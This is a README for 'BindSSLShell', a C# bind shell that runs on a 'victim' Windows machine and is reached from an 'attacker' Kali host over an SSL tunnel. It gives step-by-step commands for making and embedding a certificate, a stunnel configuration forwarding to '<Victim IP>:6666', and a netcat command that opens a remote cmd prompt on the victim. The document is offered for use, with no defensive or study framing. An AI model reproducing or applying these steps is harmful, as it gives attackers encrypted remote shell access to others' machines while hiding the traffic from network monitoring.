# BindSSLShell
How to BSOS [Bindshell over SSL] ver 1.0

* -Server (the victim): BindSSLShell.exe, console application coded in C# (FW Net 3.5) IDE Visual Studio CE 2017
* -Client (the attacker): Kali Linux with stunnel installed
<br/>
For the server side (the victim)

1. create the certificate:
   1. move to the makecert location, in my case C:\Program Files (x86)\Windows Kits\10\bin\10.0.17763.0\x64
   1. open a cmd as administrator and execute the following: makecert.exe -r -pe -n "CN=localhost" -sky exchange -sv server.pvk server.cer
   1. enter required password, then execute: pvk2pfx -pvk server.pvk -spc server.cer -pfx server.pfx. Enter required server password
1. include the Server.pfx as resource in your VS project (console app) and set the Copy to the output directory as Copy. Eventually you can embed the certificate and load it at runtime, more info: https://stackoverflow.com/questions/3314140/how-to-read-embedded-resource-text-file, so you will have to deploy a single file.
<br/>	
In our attacker machine (Kali Linux) we will use stunnel (since the server require SSL) in conjunction with nc

1. install stunnel:
	1. apt-get install stunnel
1. configure stunnel to forward nc traffic over his ssl tunnel. we must create the file /etc/stunnel/stunnel.conf with the following content:
	>[nc]
	>client = yes
	>accept = localhost:8443
	>connect = <Victim IP>:6666
	--- end of file ---
	<br/>so we listeng on the port 8443 and we forward the traffic to the victim IP port 6666. Of coures you have to set the Victim Ip (server side) value according
	
1. start stunnel
	1. service stunnel4 start
		
1. check if it's running (optional)
	1. >netstat -tulp
	the output should be similar to:
	>Active Internet connections (only servers)
	>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
	>tcp        0      0 localhost:8443          0.0.0.0:*               LISTEN      1156/stunnel4       
	>tcp6       0      0 localhost:8443          [::]:*                  LISTEN      1156/stunnel4       

1. presuming that you already lunched the bindshell on the victim you can connect to it through the tunnel:
	1. nc localhost 8443
	
1. you should get a cmd prompt
	


	



![...](img/shel_ssl.png?raw=true)
